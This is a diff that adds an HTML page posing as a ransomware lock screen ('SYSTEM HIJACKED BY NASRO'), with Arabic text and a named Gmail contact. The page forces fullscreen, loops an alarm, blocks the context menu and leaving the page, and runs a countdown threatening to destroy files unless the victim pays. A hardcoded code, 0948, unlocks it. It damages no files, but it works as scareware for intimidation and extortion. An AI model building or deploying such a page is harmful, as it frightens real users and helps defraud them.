@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>⚠️ SYSTEM TERMINATED ⚠️</title>
+    <style>
+        body {
+            background-color: black; color: #0f0; font-family: 'Courier New', monospace;
+            margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh;
+        }
+        /* خلفية الهاكرز المتحركة */
+        canvas { position: absolute; top: 0; left: 0; z-index: 1; }
+        
+        .box {
+            position: relative; z-index: 10; background: rgba(0, 0, 0, 0.9);
+            border: 3px solid #f00; padding: 40px; text-align: center;
+            box-shadow: 0 0 30px #f00; width: 80%; max-width: 600px;
+        }
+        h1 { color: #f00; font-size: 2.5rem; text-shadow: 0 0 10px #f00; }
+        .warning { font-size: 1.2rem; color: #fff; margin: 20px 0; border-bottom: 1px solid #f00; padding-bottom: 10px; }
+        input {
+            padding: 15px; width: 70%; background: #111; border: 1px solid #0f0;
+            color: #0f0; font-size: 20px; text-align: center; outline: none;
+        }
+        .timer { font-size: 3rem; color: #f00; font-weight: bold; margin: 20px 0; }
+        button {
+            margin-top: 20px; padding: 15px 30px; background: #f00; color: #fff;
+            border: none; cursor: pointer; font-weight: bold; width: 100%;
+        }
+    </style>
+</head>
+<body oncontextmenu="return false;">
+
+    <canvas id="matrix"></canvas>
+
+    <div class="box">
+        <h1>SYSTEM HIJACKED BY NASRO</h1>
+        <div class="timer" id="countdown">60</div>
+        <div class="warning">
+            لا يمكنك الخروج إلا بالدفع، أنت الآن في قبضتي!<br>
+            سيتم تدمير ملفاتك عند انتهاء العداد.
+        </div>
+        <input type="password" id="pass" placeholder="أدخل كود فك التشفير">
+        <button onclick="check()">فك التشفير الآن</button>
+        <p style="color: #666; margin-top: 20px;">Contact: nassro0948@gmail.com</p>
+    </div>
+
+    <audio id="alarm" loop>
+        <source src="https://www.soundjay.com/buttons/beep-01a.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // تأثير الماتريكس (خلفية الهاكرز)
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+        const letters = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0f0";
+            ctx.font = fontSize + "px arial";
+            drops.forEach((y, i) => {
+                const text = letters[Math.floor(Math.random() * letters.length)];
+                ctx.fillText(text, i * fontSize, y * fontSize);
+                if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            });
+        }
+        setInterval(draw, 33);
+
+        // تفعيل الإنذار وملء الشاشة عند أول ضغطة
+        document.body.onclick = function() {
+            document.getElementById('alarm').play();
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen();
+            }
+        };
+
+        // العداد التنازلي
+        let timeLeft = 60;
+        const timerElement = document.getElementById('countdown');
+        const interval = setInterval(() => {
+            timeLeft--;
+            timerElement.innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(interval);
+                alert("تم تدمير النظام بنجاح! وداعاً.");
+                location.reload();
+            }
+        }, 1000);
+
+        // منع الخروج
+        window.onbeforeunload = function() { return "قبضة نصرو لا ترحم!"; };
+
+        function check() {
+            const p = document.getElementById('pass').value;
+            if(p === "0948") {
+                window.onbeforeunload = null;
+                alert("تم القبول.. أنت محظوظ هذه المرة.");
+                window.location.href = "https://google.com";
+            } else {
+                alert("كود خاطئ! العداد سيتسارع الآن!");
+                timeLeft -= 5; // عقاب عند الخطأ
+            }
+        }
+    </script>
+</body>
+</html>
